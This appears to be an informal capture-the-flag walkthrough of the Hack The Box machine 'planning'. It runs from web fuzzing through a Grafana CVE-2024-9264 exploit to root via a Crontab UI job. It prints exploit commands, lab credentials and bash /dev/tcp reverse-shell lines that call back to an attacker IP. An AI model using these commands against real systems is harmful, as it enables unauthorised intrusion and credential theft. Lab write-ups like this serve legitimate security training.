I get credentials to start with

admin 0D5oT70Fq13EvB5r

Initial QUICK TCP SCAN



I see theres port 22 open and port 80. 


Looking at the web server I see meet our instructurs there seems to be three people so three users


Stella Haks 

Rose Mary

Bob Moss


So if I have to fuzz anything ill fuzz with the names

stella 
rose
bob
admin

will be my username wordlist.


Since SSH didnt work with the credentials I assume itll maybe be a Samba server or a SNMP




Also I notice there is alot of .php pages on this so when i fuzz I will scan for .php endpoints


The contact endpoint doesnt seem to actual submit any form as no data is sent with it

Lets fuzz for subdomains and directories with feroxbuster and ffuf




I dont find anything intresting fuzzing subdomains Lets try fuzzing for Directories


```
feroxbuster -u http://planning.htb -w /home/haxor/pen/SecLists/Discovery/Web-Content/raft-large-directories.txt -x php

```

http://planning.htb/lib/owlcarousel/LICENSE

what is owlcarousel? 





This also exists

http://planning.htb/js/main.js


as does this

http://planning.htb/enroll.php

There is no relfection however there may be on the end of the maybe could get xss to steal admin cookie?


I once more fuzz subdomains with a different wordlist


```
ffuf -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -fs 178
```

i find the grafana subdomain


which brings me to a login where i use 


admin : 0D5oT70Fq13EvB5r


upon looking up grafana i find this cve

https://github.com/z3k0sec/File-Read-CVE-2024-9264/


Which affects

Grafana >= v11.0.0 (all v11.x.y are impacted) 



this works

python3 poc.py --url http://grafana.planning.htb --user admin --password 0D5oT70Fq13EvB5r --file /etc/passwd


So i can read any file.
how can i get command injection though

10.10.14.64

Lets use this version to get RCE

https://github.com/nollium/CVE-2024-9264

and this is our payload for rn we can change it if we need to 


```
python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'whoami' http://grafana.planning.htb

```



lets try this one

https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

and i use

python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.64 --reverse-port 1337

when i get the reverse shell i see that i am root and i see run.sh

which says its in a docker file


and there is a .dockerenv file which tells me this is in a docker container

Ok so i search for the database with 

find . -type f -name "*.db"


so so the file is at /var/lib/grafana/grafana.db so lets just read it via LFI


I transfer the data by base64 encoding it all


Nvm it too big ima use curl

After getting stuck on this for a long time i use env and get some credentials

```
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=/usr/bin/sh
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana

```


This works with ssh


enzo : RioTecRANDEntANT!



```

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```


cronjobs found with linpeas


```

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:39699         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```



port 8000 is intresting.


/var/backups


I also find some SUID binaries


i found a crontab running as root.

/opt/crontabs/crontab.db


so i ssh port forward


ssh -L 8075:127.0.0.1:8000 enzo@planning.htb


It asks for credentials and i find them here 

/opt/crontabs/crontab.db



root : P4ssw0rdS0pRi0T3c

got me into a crontabUI

which there is a root cleanup kit and i edit the command to run

bash -c 'bash -i >& /dev/tcp/10.10.14.64/5091 0>&1'



